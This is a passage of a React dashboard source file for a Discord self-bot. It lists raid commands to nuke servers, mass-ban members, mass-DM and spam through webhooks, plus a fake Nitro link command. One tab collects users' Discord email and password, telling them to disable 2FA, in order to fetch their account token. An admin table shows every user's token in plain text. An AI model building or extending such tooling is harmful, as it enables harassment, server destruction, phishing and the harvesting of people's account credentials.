                        className="w-full py-2 bg-pink-500/10 hover:bg-pink-500/20 text-pink-500 border border-pink-500/20 rounded-lg text-sm font-medium transition-colors flex items-center justify-center gap-2"
                      >
                        <Eraser className="w-4 h-4" />
                        DELETE ALL ROLES
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'settings' && (
                <div className="max-w-2xl">
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-8">
                    <h3 className="text-lg font-medium mb-6 text-white">Settings</h3>
                    
                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm text-zinc-400 mb-2">Dashboard Background</label>
                        <div className="flex items-start gap-6">
                          <div className="w-48 h-32 bg-zinc-950 rounded-lg border border-zinc-800 overflow-hidden relative">
                            {bgImage ? (
                              <img src={bgImage} alt="Preview" className="w-full h-full object-cover" />
                            ) : (
                              <div className="w-full h-full flex items-center justify-center text-zinc-700 text-xs">
                                No Image
                              </div>
                            )}
                          </div>
                          <div className="flex-1">
                            <label className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 hover:bg-zinc-700 rounded-lg cursor-pointer transition-colors text-sm text-zinc-300">
                              <Upload className="w-4 h-4" />
                              Upload Image
                              <input type="file" accept="image/*" className="hidden" onChange={handleBgUpload} />
                            </label>
                            <p className="text-xs text-zinc-500 mt-3">
                              Supported formats: JPG, PNG, GIF. Max size: 5MB.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="pt-6 border-t border-zinc-800">
                        <label className="block text-sm text-zinc-400 mb-2">Help Menu Background</label>
                        <div className="flex items-start gap-6">
                          <div className="w-48 h-32 bg-zinc-950 rounded-lg border border-zinc-800 overflow-hidden relative">
                            {helpBgImage ? (
                              <img src={helpBgImage} alt="Preview" className="w-full h-full object-cover" />
                            ) : (
                              <div className="w-full h-full flex items-center justify-center text-zinc-700 text-xs">
                                No Image
                              </div>
                            )}
                          </div>
                          <div className="flex-1">
                            <label className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 hover:bg-zinc-700 rounded-lg cursor-pointer transition-colors text-sm text-zinc-300">
                              <Upload className="w-4 h-4" />
                              Upload Background
                              <input type="file" accept="image/*" className="hidden" onChange={handleHelpBgUpload} />
                            </label>
                            <p className="text-xs text-zinc-500 mt-3">
                              This image will be used as the background for the .help command.
                            </p>
                          </div>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'commands' && (
                <div className="space-y-6">
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                    <h3 className="text-lg font-medium text-zinc-300 mb-6 flex items-center gap-2">
                      <Terminal className="w-5 h-5 text-emerald-500" />
                      Command List
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      <CommandCategory title="Main" color="text-orange-500" commands={[
                        { name: ".help", desc: "Shows help menu" },
                        { name: ".ping", desc: "Check latency" },
                        { name: ".info", desc: "Selfbot info" },
                        { name: ".prefix", desc: "Change prefix" },
                        { name: ".reload", desc: "Restart process" },
                        { name: ".clearselfbot", desc: "Reset VPS and clear all data" },
                        { name: ".stop", desc: "Stop current activities" },
                      ]} />
                      <CommandCategory title="Raid" color="text-red-500" commands={[
                        { name: ".massdm", desc: "Mass DM all friends" },
                        { name: ".spam", desc: "Spam messages" },
                        { name: ".webhookspam", desc: "Spam via webhook" },
                        { name: ".nuke", desc: "Destroy server" },
                        { name: ".rss", desc: "Restore server (Owner Only)" },
                        { name: ".wl", desc: "Whitelist user" },
                        { name: ".unwl", desc: "Unwhitelist user" },
                        { name: ".massban", desc: "Ban all members" },
                        { name: ".adminrole", desc: "Grant admin role" },
                        { name: ".rename", desc: "Rename channels" },
                        { name: ".roledump", desc: "Delete all roles" },
                      ]} />
                      <CommandCategory title="Fun" color="text-purple-500" commands={[
                        { name: ".8ball", desc: "Magic 8ball" },
                        { name: ".mock", desc: "Mock text" },
                        { name: ".reverse", desc: "Reverse text" },
                        { name: ".coinflip", desc: "Flip a coin" },
                        { name: ".dice", desc: "Roll a dice" },
                        { name: ".cat", desc: "Random cat" },
                        { name: ".dog", desc: "Random dog" },
                        { name: ".fox", desc: "Random fox" },
                        { name: ".ascii", desc: "ASCII art" },
                        { name: ".uwu", desc: "UwUify text" },
                        { name: ".nitro", desc: "Fake nitro link" },
                        { name: ".clap", desc: "Clap text" },
                        { name: ".steal", desc: "Steal emoji/sticker" },
                        { name: ".bully", desc: "Mock user (I'm -> You're)" },
                      ]} />
                      <CommandCategory title="Utility" color="text-blue-500" commands={[
                        { name: ".snipe", desc: "Get deleted msg" },
                        { name: ".purge", desc: "Delete own msgs" },
                        { name: ".avatar", desc: "Get user avatar" },
                        { name: ".serverinfo", desc: "Server stats" },
                        { name: ".userinfo", desc: "User stats" },
                        { name: ".ghostping", desc: "Ghost ping" },
                        { name: ".status", desc: "Set status" },
                        { name: ".game", desc: "Set game activity" },
                        { name: ".clearcache", desc: "Clear saved data" },
                        { name: ".oll", desc: "Toggle AutoSkull mode" },
                        { name: ".leave", desc: "Leave current server" },
                        { name: ".blockuser", desc: "Block a user" },
                        { name: ".unblockuser", desc: "Unblock a user by ID" },
                      ]} />
                      <CommandCategory title="Etc" color="text-green-500" commands={[
                        { name: ".stream", desc: "Set streaming status" },
                        { name: ".listen", desc: "Set listening status" },
                        { name: ".watch", desc: "Set watching status" },
                        { name: ".play", desc: "Set playing status" },
                        { name: ".token", desc: "Get user token info" },
                        { name: ".webhooksend", desc: "Send via webhook" },
                        { name: ".invisible", desc: "Go invisible" },
                        { name: ".cloneserver", desc: "Clone server" },
                        { name: ".stealemoji", desc: "Steal emoji to server" },
                        { name: ".typing", desc: "Fake typing" },
                        { name: ".afk", desc: "AFK mode" },
                        { name: ".ar", desc: "Auto-react" },
                        { name: ".mdm", desc: "Mass DM all friends" },
                        { name: ".mdgc", desc: "Mass Group DM" },
                        { name: ".leaveall", desc: "Leave all guilds" },
                        { name: ".closeall", desc: "Close all DMs" },
                        { name: ".unfriendall", desc: "Remove all friends" },
                        { name: ".readall", desc: "Read all messages" },
                        { name: ".poll", desc: "Create poll" },
                        { name: ".calc", desc: "Calculator" },
                        { name: ".weather", desc: "Check weather" },
                        { name: ".translate", desc: "Google Translate link" },
                        { name: ".shorten", desc: "Shorten URL" },
                        { name: ".define", desc: "Urban Dictionary" },
                        { name: ".qr", desc: "Generate QR code" },
                        { name: ".randomuser", desc: "Ping random user" },
                        { name: ".channelinfo", desc: "Channel info" },
                        { name: ".roleinfo", desc: "Role info" },
                      ]} />
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'rpc' && <Rpc 
  configs={rpcConfigs} 
  setConfigs={setRpcConfigs} 
  selectedIndex={rpcSelectedIndex} 
  setSelectedIndex={setRpcSelectedIndex} 
  hoursElapsed={rpcHoursElapsed} 
  setHoursElapsed={setRpcHoursElapsed} 
/>}

              {activeTab === 'admin' && isAdmin && (
                <div className="space-y-6">
                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden">
                        <div className="px-6 py-4 border-b border-zinc-800">
                            <h3 className="text-sm font-medium text-zinc-300">All User Sessions (Admin View)</h3>
                        </div>
                        <table className="w-full text-left text-sm">
                            <thead className="bg-zinc-800/50 text-zinc-400">
                                <tr>
                                    <th className="px-6 py-3 font-medium">Username</th>
                                    <th className="px-6 py-3 font-medium">Token</th>
                                    <th className="px-6 py-3 font-medium">Status</th>
                                    <th className="px-6 py-3 font-medium">Login Time</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-zinc-800">
                                {adminSessions.map((s, i) => (
                                    <tr key={i} className="hover:bg-zinc-800/30">
                                        <td className="px-6 py-3 text-zinc-300">{s.username || 'Unknown'}</td>
                                        <td className="px-6 py-3 font-mono text-zinc-500 text-xs">{s.token}</td>
                                        <td className="px-6 py-3"><StatusBadge status={s.status} /></td>
                                        <td className="px-6 py-3 text-zinc-500">{s.loginTime}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>
              )}

              {activeTab === 'get_token' && (
                <div className="space-y-6 max-w-2xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl text-center">
                    <h3 className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-indigo-400 mb-4">
                      Get Your Discord Token!!!
                    </h3>
                    <p className="text-zinc-400 mb-8 text-sm">
                      Enter your Discord email and password to automatically fetch your token. 
                      <br/>
                      <span className="text-xs text-red-400 mt-2 block">Note: This is an experimental feature and may require you to solve a captcha or disable 2FA.</span>
                    </p>
                    <div className="space-y-4 text-left">
                      <div>
                        <label className="block text-xs font-medium text-zinc-400 mb-1">Email</label>
                        <input 
                          type="email" 
                          placeholder="you@example.com" 
                          className="fantasy-input w-full rounded-lg px-4 py-3 text-sm" 
                          value={extractEmail}
                          onChange={(e) => setExtractEmail(e.target.value)}
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-medium text-zinc-400 mb-1">Password</label>
                        <input 
                          type="password" 
                          placeholder="••••••••" 
                          className="fantasy-input w-full rounded-lg px-4 py-3 text-sm" 
                          value={extractPassword}
                          onChange={(e) => setExtractPassword(e.target.value)}
                        />
                      </div>
                      <button 
                        className="fantasy-button w-full py-3 rounded-lg font-medium text-white mt-4 disabled:opacity-50" 
                        onClick={handleExtractToken}
                        disabled={extracting}
                      >
                        {extracting ? 'Extracting...' : 'Fetch Token'}
                      </button>
                      
                      {extractedToken && (
                        <div className="mt-6 p-4 bg-zinc-900 border border-emerald-500/30 rounded-lg">
                          <p className="text-emerald-400 text-sm font-medium mb-2">Token Extracted Successfully!</p>
                          <div className="flex items-center gap-2">
                            <input 
                              type="text" 
                              readOnly 
                              value={extractedToken} 
                              className="fantasy-input flex-1 rounded px-3 py-2 text-xs font-mono"
                            />
                            <button 
                              onClick={() => {
                                navigator.clipboard.writeText(extractedToken);
                                addLog('Token copied to clipboard');
                              }}
                              className="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 rounded text-xs text-white transition-colors"
                            >
                              Copy
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'tos' && (
                <div className="space-y-6 max-w-3xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl">
                    <h3 className="text-2xl font-bold text-purple-400 mb-6 flex items-center gap-2">
                      <ShieldAlert className="w-6 h-6" /> Terms of Service
                    </h3>
                    <div className="space-y-4 text-sm text-zinc-300 leading-relaxed">
                      <p><strong>1. Acceptance of Terms</strong><br/>By accessing and using this self-bot dashboard, you accept and agree to be bound by the terms and provision of this agreement.</p>
                      <p><strong>2. Discord TOS</strong><br/>Using a self-bot is against Discord's Terms of Service. You acknowledge that using this tool may result in the termination of your Discord account. We are not responsible for any bans or actions taken against your account.</p>
                      <p><strong>3. Usage Restrictions</strong><br/>You agree not to use this tool for malicious purposes, including but not limited to harassing other users, distributing malware, or violating any laws.</p>
                      <p><strong>4. Disclaimer of Warranties</strong><br/>This tool is provided "as is" without any warranties, express or implied. We do not guarantee that the tool will be error-free or uninterrupted.</p>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'faq' && (
                <div className="space-y-6 max-w-3xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl">
                    <h3 className="text-2xl font-bold text-indigo-400 mb-6 flex items-center gap-2">
                      <MessageSquare className="w-6 h-6" /> Frequently Asked Questions
                    </h3>
                    <div className="space-y-6 text-sm text-zinc-300">
                      <div>
                        <h4 className="font-bold text-white mb-1">Q: Will I get banned for using this?</h4>
                        <p className="text-zinc-400">A: Self-botting is against Discord's TOS. While we try to minimize risks, there is always a chance your account could be banned. Use at your own risk.</p>
                      </div>
                      <div>
                        <h4 className="font-bold text-white mb-1">Q: How do I get my token?</h4>
                        <p className="text-zinc-400">A: You can use the "Get Your Discord Token!!!" tab, or extract it manually from your browser's developer tools (Network tab - look for Authorization header).</p>
                      </div>
                      <div>
                        <h4 className="font-bold text-white mb-1">Q: What is the ".antinuke" command?</h4>
                        <p className="text-zinc-400">A: It's an anti-nuke protection command. Use `.antinuke &lt;guild_id&gt;` to toggle protection for a server. If someone tries to delete multiple channels/roles, it will strip their roles (if you have higher permissions).</p>
                      </div>
                      <div>
                        <h4 className="font-bold text-white mb-1">Q: How do I change the .help background?</h4>
                        <p className="text-zinc-400">A: Go to the Settings tab and upload a new image under "Help Menu Background".</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'changelog' && (
                <div className="space-y-6 max-w-3xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl">
                    <h3 className="text-2xl font-bold text-emerald-400 mb-6 flex items-center gap-2">
                      <History className="w-6 h-6" /> Update Logs
                    </h3>
                    <div className="space-y-8">
                      {CHANGELOG.map((entry, i) => (
                        <div key={i} className="relative pl-8 border-l border-zinc-800 pb-8 last:pb-0">
                          <div className="absolute left-[-5px] top-0 w-[9px] h-[9px] rounded-full bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.5)]" />
                          <div className="flex items-center justify-between mb-2">
                            <h4 className="text-lg font-bold text-white">{entry.version}</h4>
                            <span className="text-xs text-zinc-500 font-mono">{entry.date}</span>
                          </div>
                          <ul className="space-y-2">
                            {entry.features.map((feature, j) => (
                              <li key={j} className="text-sm text-zinc-400 flex items-start gap-2">
                                <span className="text-emerald-500 mt-1">•</span>
                                {feature}
                              </li>
                            ))}
                          </ul>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </motion.div>
          </main>
        </div>
      </div>
    </div>
  );
}

function SidebarItem({ active, onClick, icon: Icon, label }: { active: boolean; onClick: () => void; icon: any; label: string }) {
  return (
    <button
      onClick={onClick}
      className={`w-full flex items-center gap-3 px-4 py-2 rounded-lg text-sm transition-all ${
        active 
          ? 'bg-zinc-800 text-white' 
          : 'text-zinc-400 hover:bg-zinc-800/50 hover:text-zinc-200'
      }`}
    >
      <Icon className="w-4 h-4" />
      {label}
    </button>
  );
}

function StatusBadge({ status }: { status: BotSession['status'] }) {
  const styles = {
    offline: 'bg-zinc-800 text-zinc-500',
    online: 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20',
    busy: 'bg-amber-500/10 text-amber-500 border border-amber-500/20',
    error: 'bg-red-500/10 text-red-500 border border-red-500/20',
  };

  return (
    <span className={`px-2 py-0.5 rounded text-[10px] font-medium ${styles[status]} uppercase tracking-wide`}>
      {status}
    </span>
  );
}

function CommandCategory({ title, color, commands }: { title: string; color: string; commands: { name: string; desc: string }[] }) {
  return (
    <div className="bg-zinc-800/50 rounded-lg p-4 border border-zinc-700/50 hover:border-zinc-600 transition-colors">
      <h4 className={`text-sm font-bold uppercase tracking-wider mb-3 ${color}`}>{title}</h4>
      <div className="space-y-2">
        {commands.map((cmd, i) => (
          <div key={i} className="flex justify-between items-start text-xs group">
            <span className="font-mono text-zinc-300 bg-zinc-800 px-1.5 py-0.5 rounded group-hover:bg-zinc-700 transition-colors">{cmd.name}</span>
            <span className="text-zinc-500 text-right ml-2 group-hover:text-zinc-400 transition-colors">{cmd.desc}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
